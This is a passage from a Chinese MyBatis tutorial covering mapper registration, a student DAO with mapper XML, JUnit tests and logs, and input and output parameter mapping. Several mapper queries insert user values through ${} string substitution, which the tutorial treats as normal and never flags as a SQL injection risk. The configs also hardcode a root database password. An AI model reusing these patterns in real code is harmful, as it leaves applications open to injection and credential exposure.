            mapper 单个注册（mapper如果多的话，不太可能用这种方式）
                resource：引用类路径下的文件
                url：引用磁盘路径下的资源
                class，引用接口
            package 批量注册（基本上使用这种方式）
                name：mapper接口与mapper.xml所在的包名
        -->

        <!-- 第一种：注册sql映射文件-->
        <mapper resource="com/zhangguo/mapper/UserMapper.xml" />

        <!-- 第二种：注册接口sql映射文件必须与接口同名，并且放在同一目录下-->
        <mapper class="com.zhangguo.mapper.UserMapper" />

        <!-- 第三种：注册基于注解的接口  基于注解   没有sql映射文件，所有的sql都是利用注解写在接口上-->
        <mapper class="com.zhangguo.mapper.TeacherMapper" />

        <!-- 第四种：批量注册  需要将sql配置文件和接口放到同一目录下-->
        <package name="com.zhangguo.mapper" />

    </mappers>

2.5.1、通过resource加载单个映射文件

    <mappers>
        <!--根据路径注册一个基于XML的映射器-->
        <mapper resource="mapper/studentMapper.xml"/>
    </mappers>

注意位置

2.5.2:通过mapper接口加载单个映射文件

    <!-- 通过mapper接口加载单个映射配置文件
            遵循一定的规范：需要将mapper接口类名和mapper.xml映射文件名称保持一致，且在一个目录中；
            上边规范的前提是：使用的是mapper代理方法;
      -->
         <mapper class="com.mybatis.mapper.UserMapper"/> 

按照上边的规范，将mapper.java和mapper.xml放在一个目录 ，且同名。

注意：
对于Maven项目，IntelliJ IDEA默认是不处理src/main/java中的非java文件的，不专门在pom.xml中配置<resources>是会报错的，参考处理办法：

<resources>
            <resource>
                <directory>src/main/java</directory>
                <includes>
                    <include>**/*.properties</include>
                    <include>**/*.xml</include>
                </includes>
                <filtering>true</filtering>
            </resource>
            <resource>
                <directory>src/main/resources</directory>
                <includes>
                    <include>**/*.properties</include>
                    <include>**/*.xml</include>
                </includes>
                <filtering>true</filtering>
            </resource>
</resources>

所以src/main/java中最好不要出现非java文件。实际上，将mapper.xml放在src/main/resources中比较合适。
2.5.3、批量加载mapper

<!-- 批量加载映射配置文件,mybatis自动扫描包下面的mapper接口进行加载
     遵循一定的规范：需要将mapper接口类名和mapper.xml映射文件名称保持一致，且在一个目录中；
     上边规范的前提是：使用的是mapper代理方法;
      -->
<package name="com.mybatis.mapper"/> 

最后的配置文件：


<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE configuration
        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-config.dtd">
<configuration>
    <!--导入db.properties文件中的所有key-value数据-->
    <!--外部引入的内容将覆盖内部定义的-->
    <properties resource="db.properties">
        <!--定义一个名称为driver，值为com.mysql.jdbc.Driver的属性-->
        <property name="mysql.driver" value="com.mysql.jdbc.Driver"></property>
    </properties>
    
    <settings>
        <!--设置是否允许缓存-->
        <setting name="cacheEnabled" value="true"/>
        <!--设置日志输出的目标-->
        <setting name="logImpl" value="STDOUT_LOGGING"/>
    </settings>

    <!--别名-->
    <typeAliases>
        <!--定义单个别名，指定名称为student，对应的类型为com.zhangguo.mybatis02.entities.Student-->
        <!--<typeAlias type="com.zhangguo.mybatis02.entities.Student" alias="student"></typeAlias>-->
        <!--指定包名下所有的类被自动扫描并定义默认别名，
        mybatis会自动扫描包中的pojo类，自动定义别名，别名就是类名(首字母大写或小写都可以)-->
        <package name="com.zhangguo.mybatis02.entities"></package>
    </typeAliases>

    <!--注册自定义的类型处理器-->
    <typeHandlers>
        <!--<typeHandler handler="" javaType="" jdbcType=""></typeHandler>-->
    </typeHandlers>
    
    <!--环境配置，default为默认选择的环境-->
    <environments default="development">
        <!--开发-->
        <environment id="development">
            <!--事务管理-->
            <transactionManager type="JDBC"/>
            <!--连接池-->
            <dataSource type="POOLED">
                <!--引用属性${mysql.driver}-->
                <property name="driver" value="${mysql.driver}"/>
                <property name="url" value="${mysql.url}"/>
                <property name="username" value="${mysql.username}"/>
                <property name="password" value="${mysql.password}"/>
            </dataSource>
        </environment>
        <!--运行-->
        <environment id="work">
            <transactionManager type="JDBC"/>
            <dataSource type="POOLED">
                <property name="driver" value="${driver}"/>
                <property name="url" value="jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&amp;characterEncoding=UTF-8"/>
                <property name="username" value="root"/>
                <property name="password" value="uchr@123"/>
            </dataSource>
        </environment>
    </environments>

    <mappers>
        <!--根据路径注册一个基于XML的映射器-->
        <mapper resource="mapper/studentMapper.xml"/>
        <!--根据类型注册一个基于注解的映射器，接口-->
        <mapper class="com.zhangguo.mybatis02.dao.StudentMapper"></mapper>
        <!--根据包名批量注册包下所有基于注解的映射器-->
        <package name="com.zhangguo.mybatis02.dao"></package>
    </mappers>

</configuration>

View Code
三、使用接口+XML实现完整数据访问
上一章中使用XML作为映射器与使用接口加注解的形式分别实现了完整的数据访问，可以点击《MyBatis学习总结（一）——ORM概要与MyBatis快速起步》查看，这里综合两种方式实现数据访问，各取所长，配置灵活，在代码中不需要引用很长的id名称，面向接口编程，示例如下：
3.1、在IDEA中创建一个Maven项目
创建成功的目录结构如下：

3.2、添加依赖
pom.xml文件如下：

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.zhangguo.mybatis03</groupId>
    <artifactId>MyBatis03</artifactId>
    <version>1.0-SNAPSHOT</version>
    
    <dependencies>
        <!--MyBatis -->
        <dependency>
            <groupId>org.mybatis</groupId>
            <artifactId>mybatis</artifactId>
            <version>3.4.6</version>
        </dependency>
        <!--MySql数据库驱动 -->
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.38</version>
        </dependency>
        <!-- JUnit单元测试工具 -->
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.11</version>
            <scope>test</scope>
        </dependency>
    </dependencies>

</project>

添加成功效果如下：

3.3、创建POJO类
学生POJO类如下：

package com.zhangguo.mybatis03.entities;

/**
 * 学生实体
 */
public class Student {
    private int id;
    private String name;
    private String sex;

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getSex() {
        return sex;
    }

    public void setSex(String sex) {
        this.sex = sex;
    }

    @Override
    public String toString() {
        return "Student{" +
                "id=" + id +
                ", name='" + name + '\'' +
                ", sex='" + sex + '\'' +
                '}';
    }
}

3.4、创建数据访问接口
StudentMapper.java：

package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Student;

import java.util.List;

public interface StudentMapper {
    /**
     * 根据学生编号获得学生对象
     */
    Student selectStudentById(int id);

    /**
     * 根据学生姓名获得学生集合
     */
    List<Student> selectStudentsByName(String name);

    /**
     * 添加学生
     */
    int insertStudent(Student entity);

    /**
     * 更新学生
     */
    int updateStudent(Student entity);

    /**
     * 删除学生
     */
    int deleteStudent(int id);
}

3.5、根据接口编写XML映射器
要求方法名与Id同名，包名与namespace同名。
在src/main/resources/mapper目录下创建studentMapper.xml文件，内容如下：

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.zhangguo.mybatis03.dao.StudentMapper">
    <select id="selectStudentById" resultType="Student">
        SELECT id,name,sex from student where id=#{id}
    </select>

    <select id="selectStudentsByName" parameterType="String" resultType="student">
        SELECT id,name,sex from student where name like '%${value}%';
    </select>

    <insert id="insertStudent" parameterType="student">
        insert into student(name,sex) VALUES(#{name},'${sex}')
    </insert>

    <update id="updateStudent" parameterType="student">
        update student set name=#{name},sex=#{sex} where id=#{id}
    </update>

    <delete id="deleteStudent" parameterType="int">
        delete from student where id=#{id}
    </delete>

</mapper>

3.6、添加MyBatis核心配置文件
在src/main/resources目录下创建两个配置文件。
mybatisCfg.xml文件如下：

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE configuration
        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-config.dtd">
<configuration>
    <!--导入db.properties文件中的所有key-value数据-->
    <!--外部引入的内容将覆盖内部定义的-->
    <properties resource="db.properties">
        <!--定义一个名称为driver，值为com.mysql.jdbc.Driver的属性-->
        <property name="mysql.driver" value="com.mysql.jdbc.Driver"></property>
    </properties>

    <settings>
        <!--设置是否允许缓存-->
        <setting name="cacheEnabled" value="true"/>
        <!--设置日志输出的目标-->
        <setting name="logImpl" value="STDOUT_LOGGING"/>
    </settings>

    <!--别名-->
    <typeAliases>
        <!--定义单个别名，指定名称为student，对应的类型为com.zhangguo.mybatis02.entities.Student-->
        <!--<typeAlias type="com.zhangguo.mybatis02.entities.Student" alias="student"></typeAlias>-->
        <!--指定包名下所有的类被自动扫描并定义默认别名，
        mybatis会自动扫描包中的pojo类，自动定义别名，别名就是类名(首字母大写或小写都可以)-->
        <package name="com.zhangguo.mybatis03.entities"></package>
    </typeAliases>

    <!--注册自定义的类型处理器-->
    <typeHandlers>
        <!--<typeHandler handler="" javaType="" jdbcType=""></typeHandler>-->
    </typeHandlers>

    <!--环境配置，default为默认选择的环境-->
    <environments default="development">
        <!--开发-->
        <environment id="development">
            <!--事务管理-->
            <transactionManager type="JDBC"/>
            <!--连接池-->
            <dataSource type="POOLED">
                <!--引用属性${mysql.driver}-->
                <property name="driver" value="${mysql.driver}"/>
                <property name="url" value="${mysql.url}"/>
                <property name="username" value="${mysql.username}"/>
                <property name="password" value="${mysql.password}"/>
            </dataSource>
        </environment>
        <!--运行-->
        <environment id="work">
            <transactionManager type="JDBC"/>
            <dataSource type="POOLED">
                <property name="driver" value="${driver}"/>
                <property name="url" value="jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&amp;characterEncoding=UTF-8"/>
                <property name="username" value="root"/>
                <property name="password" value="uchr@123"/>
            </dataSource>
        </environment>
    </environments>

    <mappers>
        <!--根据路径注册一个基于XML的映射器-->
        <mapper resource="mapper/studentMapper.xml"/>
    </mappers>

</configuration>

db.properties文件内容如下：

##MySQL连接字符串
#驱动
mysql.driver=com.mysql.jdbc.Driver
#地址
mysql.url=jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&characterEncoding=UTF-8
#用户名
mysql.username=root
#密码
mysql.password=uchr@123

3.7、编写MyBatis通用的工具类
 SqlSessionFactoryUtil.java内容如下：

package com.zhangguo.mybatis03.utils;

import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.apache.ibatis.session.SqlSessionFactoryBuilder;

import java.io.IOException;
import java.io.InputStream;

/**
 * MyBatis 会话工具类
 * */
public class SqlSessionFactoryUtil {

    /**
     * 获得会话工厂
     *
     * */
    public static SqlSessionFactory getFactory(){
        InputStream inputStream = null;
        SqlSessionFactory sqlSessionFactory=null;
        try{
            //加载mybatisCfg.xml配置文件，转换成输入流
            inputStream = SqlSessionFactoryUtil.class.getClassLoader().getResourceAsStream("mybatisCfg.xml");

            //根据配置文件的输入流构造一个SQL会话工厂
            sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);
        }
        finally {
            if(inputStream!=null){
                try {
                    inputStream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return sqlSessionFactory;
    }

    /**
     * 获得sql会话，是否自动提交
     * */
    public static SqlSession openSession(boolean isAutoCommit){
        return getFactory().openSession(isAutoCommit);
    }

    /**
     * 关闭会话
     * */
    public static void closeSession(SqlSession session){
        if(session!=null){
            session.close();
        }
    }

}

3.8、通过MyBatis实现数据访问
StudentDao.java内容如下：

package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Student;
import com.zhangguo.mybatis03.utils.SqlSessionFactoryUtil;
import org.apache.ibatis.session.SqlSession;

import java.util.List;

public class StudentDao implements StudentMapper {

    /**
     * 根据学生编号获得学生对象
     */
    public Student selectStudentById(int id) {
        Student entity = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper=session.getMapper(StudentMapper.class);

        //查询单个对象，指定参数为3
        entity = mapper.selectStudentById(id);

        //关闭
        SqlSessionFactoryUtil.closeSession(session);

        return entity;
    }


    /**
     * 根据学生姓名获得学生集合
     */
    public List<Student> selectStudentsByName(String name) {
        List<Student> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper=session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities =mapper.selectStudentsByName(name);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }


    /**
     * 添加学生
     */
    public int insertStudent(Student entity) {
        //影响行数
        int rows=0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper=session.getMapper(StudentMapper.class);

        //执行添加
        rows = mapper.insertStudent(entity);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

    /**
     * 更新学生
     */
    public int updateStudent(Student entity) {
        //影响行数
        int rows=0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper=session.getMapper(StudentMapper.class);

        //执行更新
        rows =mapper.updateStudent(entity);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

    /**
     * 删除学生
     */
    public int deleteStudent(int id) {
        //影响行数
        int rows=0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper=session.getMapper(StudentMapper.class);

        //执行删除
        rows = mapper.deleteStudent(id);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

}

最后完成的项目结构：

3.9、测试用例
在测试类上添加注解@FixMethodOrder(MethodSorters.JVM)的目的是指定测试方法按定义的顺序执行。
StudentDaoTest.java如下所示： 


package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Student;
import org.junit.*;
import org.junit.runners.MethodSorters;

import java.util.List;

/**
 * StudentDao Tester.
 *
 * @author <Authors name>
 * @version 1.0
 * @since <pre>09/26/2018</pre>
 */
@FixMethodOrder(MethodSorters.JVM)//指定测试方法按定义的顺序执行
public class StudentDaoTest {
    StudentMapper dao;
    @Before
    public void before() throws Exception {
        dao=new StudentDao();
    }

    @After
    public void after() throws Exception {
    }

    /**
     * Method: selectStudentById(int id)
     */
    @Test
    public void testSelectStudentById() throws Exception {
        Student entity=dao.selectStudentById(1);
        System.out.println(entity);
        Assert.assertNotNull(entity);
    }

    /**
     * Method: selectStudentsByName(String name)
     */
    @Test
    public void testSelectStudentsByName() throws Exception {
        List<Student> students=dao.selectStudentsByName("C");
        System.out.println(students);
        Assert.assertNotNull(students);
    }

    /**
     * Method: insertStudent
     */
    @Test
    public void testInsertStudent() throws Exception {
        Student entity=new Student();
        entity.setName("张大");
        entity.setSex("boy");

        Assert.assertEquals(1,dao.insertStudent(entity));
    }

    /**
     * Method: updateStudent
     */
    @Test
    public void testUpdateStudent() throws Exception {
        Student entity=dao.selectStudentById(11);
        entity.setName("张丽美");
        entity.setSex("girl");

        Assert.assertEquals(1,dao.updateStudent(entity));
    }

    /**
     * Method: deleteStudent
     */
    @Test
    public void testDeleteStudent() throws Exception {
        Assert.assertEquals(1,dao.deleteStudent(12));
    }
} 

View Code
3.10、测试结果
测试前的数据库：

测试结果：

日志：


"C:\Program Files\Java\jdk1.8.0_111\bin\java" -ea -Didea.test.cyclic.buffer.size=1048576 "-javaagent:C:\Program Files\JetBrains\IntelliJ IDEA 2017.2.1\lib\idea_rt.jar=2783:C:\Program Files\JetBrains\IntelliJ IDEA 2017.2.1\bin" -Dfile.encoding=UTF-8 -classpath "C:\Program Files\JetBrains\IntelliJ IDEA 2017.2.1\lib\idea_rt.jar;C:\Program Files\JetBrains\IntelliJ IDEA 2017.2.1\plugins\junit\lib\junit-rt.jar;C:\Program Files\JetBrains\IntelliJ IDEA 2017.2.1\plugins\junit\lib\junit5-rt.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\charsets.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\deploy.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\access-bridge-64.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\cldrdata.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\dnsns.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\jaccess.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\jfxrt.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\localedata.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\nashorn.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\sunec.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\sunjce_provider.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\sunmscapi.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\sunpkcs11.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\zipfs.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\javaws.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\jce.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\jfr.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\jfxswt.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\jsse.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\management-agent.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\plugin.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\resources.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\rt.jar;D:\Documents\Downloads\Compressed\MyBatis03\target\test-classes;D:\Documents\Downloads\Compressed\MyBatis03\target\classes;C:\Users\Administrator\.m2\repository\org\mybatis\mybatis\3.4.6\mybatis-3.4.6.jar;C:\Users\Administrator\.m2\repository\mysql\mysql-connector-java\5.1.38\mysql-connector-java-5.1.38.jar;C:\Users\Administrator\.m2\repository\junit\junit\4.11\junit-4.11.jar;C:\Users\Administrator\.m2\repository\org\hamcrest\hamcrest-core\1.3\hamcrest-core-1.3.jar" com.intellij.rt.execution.junit.JUnitStarter -ideVersion5 -junit4 com.zhangguo.mybatis03.dao.StudentDaoTest
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 662822946.
==>  Preparing: delete from student where id=? 
==> Parameters: 12(Integer)
<==    Updates: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@2781e022]
Returned connection 662822946 to pool.
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 1045941616.
==>  Preparing: SELECT id,name,sex from student where id=? 
==> Parameters: 11(Integer)
<==    Columns: id, name, sex
<==        Row: 11, lili, secret
<==      Total: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@3e57cd70]
Returned connection 1045941616 to pool.
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 1540270363.
==>  Preparing: update student set name=?,sex=? where id=? 
==> Parameters: 张丽美(String), girl(String), 11(Integer)
<==    Updates: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@5bcea91b]
Returned connection 1540270363 to pool.
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 681384962.
==>  Preparing: insert into student(name,sex) VALUES(?,'boy') 
==> Parameters: 张大(String)
<==    Updates: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@289d1c02]
Returned connection 681384962 to pool.
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 428910174.
==>  Preparing: SELECT id,name,sex from student where name like '%C%'; 
==> Parameters: 
<==    Columns: id, name, sex
<==        Row: 4, candy, secret
<==      Total: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@1990a65e]
Returned connection 428910174 to pool.
[Student{id=4, name='candy', sex='secret'}]
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 1134612201.
==>  Preparing: SELECT id,name,sex from student where id=? 
==> Parameters: 1(Integer)
<==    Columns: id, name, sex
<==        Row: 1, rose, girl
<==      Total: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@43a0cee9]
Returned connection 1134612201 to pool.
Student{id=1, name='rose', sex='girl'}

Process finished with exit code 0

View Code
测试后的数据库：
 
四、MyBatis输入输出映射
4.1、输入映射
通过parameterType指定输入参数的类型，类型可以是简单类型、HashMap、POJO的包装类型。
Mybatis的配置文件中的select,insert,update,delete有一个属性parameter来接收mapper接口方法中的参数。可以接收的类型有简单类型和复杂类型，但是只能是一个参数。这个属性是可选的，因为Mybatis可以通过TypeHandler来判断传入的参数类型，默认值是unset。
4.1.1、基本类型
各种java的基本数据类型。常用的有int、String、Data等
接口：

    /**
     * 根据学生编号获得学生对象
     */
    Student selectStudentById(int id);

映射：

    <select id="selectStudentById" resultType="Student" parameterType="int">
        SELECT id,name,sex from student where id=#{id}
    </select>

测试：

    /**
     * Method: selectStudentById(int id)
     */
    @Test
    public void testSelectStudentById() throws Exception {
        Student entity=dao.selectStudentById(1);
        System.out.println(entity);
        Assert.assertNotNull(entity);
    }

结果：

用#{变量名}来取值，这里的变量名是任意的，可以用value或者是其它的什么值，这里用id是为了便于理解，并不存在什么对应关系的。因为java反射主只能够得到方法参数的类型，而无从知道参数的名字的。当在动态sql中的if语句中的test传递参数时，就必须要用_parameter来传递参数了（OGNL表达式），如果你传入id就会报错。
4.1.2、多个参数
（一）、旧版本MyBatis使用索引号：

<select id="selectStudentsByNameOrSex" resultType="student">
    SELECT id,name,sex from student where name='%${0}%' or sex=#{1};
</select>

由于是多参数那么就不能使用parameterType， 改用#｛index｝是第几个就用第几个的索引，索引从0开始

注意：
如果出现错误：Parameter '0' not found. Available parameters are [arg1, arg0, param1, param2]，请使用#{arg0}或#{param1}
注意：在MyBatis3.4.4版以后不能直接使用#{0}要使用 #{arg0}

（二）、新版本MyBatis使用索引号：
接口：

    /**
     * 根据学生姓名或性别获得学生集合
     */
    List<Student> selectStudentsByNameOrSex(String name,String sex);

映射：

<select id="selectStudentsByNameOrSex" resultType="student">
    SELECT id,name,sex from student where name like '%${arg0}%' or sex=#{param2};
</select>

方法一：arg0,arg1,arg2...
方法二：param1,param2,param3...

测试：

    /**
     * Method: selectStudentsByNameOrSex(String name, String sex)
     */
    @Test
    public void selectStudentsByNameOrSex() throws Exception {
        List<Student> students=dao.selectStudentsByNameOrSex("Candy","boy");
        System.out.println(students);
        Assert.assertNotNull(students);
    }

结果：

（三）、使用Map
接口：

    /**
     * 根据学生姓名或性别获得学生集合
     */
    List<Student> selectStudentsByNameOrSex(Map<String,Object> params);

映射：

    <select id="selectStudentsByNameOrSex" resultType="student">
        SELECT id,name,sex from student where name like '%${name}%' or sex=#{sex};
    </select>

测试：

    /**
     * Method: List<Student> selectStudentsByNameOrSex(Map<String,Object> params);
     */
    @Test
    public void selectStudentsByNameOrSex() throws Exception {
        Map<String,Object> params=new HashMap<String,Object>();
        params.put("name","Candy");
        params.put("sex","girl");
        List<Student> students=dao.selectStudentsByNameOrSex(params);

        System.out.println(students);
        Assert.assertNotNull(students);
    }

结果：

（四）、注解参数名称：
接口：

    /**
     * 根据学生姓名或性别获得学生集合
     */
    List<Student> selectStudentsByNameOrSex(@Param("realname") String name,@Param("sex") String sex);

映射：

    <select id="selectStudentsByNameOrSex" resultType="student">
        SELECT id,name,sex from student where name like '%${realname}%' or sex=#{sex};
    </select>

测试：

    /**
     * Method: selectStudentsByNameOrSex(String name,String sex)
     */
    @Test
    public void testSelectStudentsByNameOrSex() throws Exception {
        List<Student> students=dao.selectStudentsByNameOrSex("C","boy");
        System.out.println(students);
        Assert.assertNotNull(students);
    }

结果：

4.1.3、POJO对象
各种类型的POJO，取值用#{属性名}。这里的属性名是和传入的POJO中的属性名一一对应。
接口：

    /**
     * 添加学生
     */
    int insertStudent(Student entity);

映射：

    <insert id="insertStudent" parameterType="student">
        insert into student(name,sex) VALUES(#{name},'${sex}')
    </insert>

测试：

    /**
     * Method: insertStudent
     */
    @Test
    public void testInsertStudent() throws Exception {
        Student entity=new Student();
        entity.setName("张明");
        entity.setSex("boy");

        Assert.assertEquals(1,dao.insertStudent(entity));
    }

结果：

如果要在if元素中测试传入的user参数,仍然要使用_parameter来引用传递进来的实际参数,因为传递进来的User对象的名字是不可考的。如果测试对象的属性,则直接引用属性名字就可以了。测试user对象:

<if test="_parameter!= null">

测试user对象的属性:

<if test="name!= null">

如果对象中还存在对象则需要使用${属性名.属性.x}方式访问
4.1.4、Map
具体请查看4.1.2节。
传入map类型,直接通过#{keyname}就可以引用到键对应的值。使用@param注释的多个参数值也会组装成一个map数据结构,和直接传递map进来没有区别。
mapper接口:

int updateByExample(@Param("user") User user, @Param("example") UserExample example);

sql映射:

<update id="updateByExample" parameterType="map" > 

update tb_user set id = #{user.id}, ... 

<if test="_parameter != null" > 

<include refid="Update_By_Example_Where_Clause" />

</if>

</update>

注意这里测试传递进来的map是否为空,仍然使用_parameter
4.1.5、集合类型
可以传递一个List或Array类型的对象作为参数,MyBatis会自动的将List或Array对象包装到一个Map对象中,List类型对象会使用list作为键名,而Array对象会用array作为键名。集合类型通常用于构造IN条件，sql映射文件中使用foreach元素来遍历List或Array元素。
假定这里需要实现多删除功能，示例如下：
接口：

    /**
     * 删除多个学生通过编号
     */
    int deleteStudents(List<Integer> ids);

映射：

    <delete id="deleteStudents">
        delete from student where id in
        <foreach collection="list" item="id" open="(" separator="," close=")">
            #{id}
        </foreach>
    </delete>

collection这里只能是list
测试：

    /**
     * Method: deleteStudents
     */
    @Test
    public void testDeleteStudents() throws Exception {
        List<Integer> ids=new ArrayList<Integer>();
        ids.add(10);
        ids.add(11);
        Assert.assertEquals(2,dao.deleteStudents(ids));
    }

结果：

当然查询中也可以这样使用

public List<XXXBean> getXXXBeanList(List<String> list);  

<select id="getXXXBeanList" resultType="XXBean">
　　select 字段... from XXX where id in
　　<foreach item="item" index="index" collection="list" open="(" separator="," close=")">  
　　　　#{item}  
　　</foreach>  
</select>  

foreach 最后的效果是select 字段... from XXX where id in ('1','2','3','4') 

对于单独传递的List或Array,在SQL映射文件中映射时,只能通过list或array来引用。但是如果对象类型有属性的类型为List或Array，则在sql映射文件的foreach元素中,可以直接使用属性名字来引用。mapper接口: 

List<User> selectByExample(UserExample example);

sql映射文件: 

<where>
<foreach collection="oredCriteria" item="criteria" separator="or">
<if test="criteria.valid">
</where>

在这里,UserExample有一个属性叫oredCriteria,其类型为List,所以在foreach元素里直接用属性名oredCriteria引用这个List即可。
item="criteria"表示使用criteria这个名字引用每一个集合中的每一个List或Array元素。
4.2、输出映射
输出映射主要有两种方式指定ResultType或ResultMap，现在分别介绍一下：
4.2.1、ResultType
使用ResultType进行输出映射，只有查询出来的列名和pojo中的属性名一致，该列才可以映射成功。
如果查询出来的列名和POJO中的属性名全部不一致，没有创建POJO对象。
只要查询出来的列名和POJO中的属性有一个一致，就会创建POJO对象。

（一）、输出简单类型
接口：

    /**
     * 获得学生总数
     * */
    long selectStudentsCount();

映射：

    <select id="selectStudentsCount" resultType="long">
        SELECT count(*) from student
    </select>

测试：

    /**
     * Method: selectStudentsCount()
     */
    @Test
    public void testSelectStudentsCount() throws Exception {
        Assert.assertNotEquals(0,dao.selectStudentsCount());
    }

结果：

查询出来的结果集只有一行一列，可以使用简单类型进行输出映射。
(二）、输出POJO对象和POJO列表 
不管是输出的POJO单个对象还是一个列表（List中存放POJO），在mapper.xml中ResultType指定的类型是一样的，但方法返回值类型不一样。
输出单个POJO对象，方法返回值是单个对象类型
接口：

    /**
     * 根据学生编号获得学生对象
     */
    Student selectStudentById(int id);

映射：

    <select id="selectStudentById" resultType="Student">
        SELECT id,name,sex from student where id=#{id}
    </select>

输出pojo对象list，方法返回值是List<POJO>
接口：

    /**
     * 根据学生姓名获得学生集合
     */
    List<Student> selectStudentsByName(String name);

映射：

    <select id="selectStudentsByName" parameterType="String" resultType="student">
        SELECT id,name,sex from student where name like '%${value}%';
    </select>

生成的动态代理对象中是根据mapper.java方法的返回值类型确定是调用selectOne(返回单个对象调用)还是selectList(返回集合对象调用)
4.2.2、ResultMap
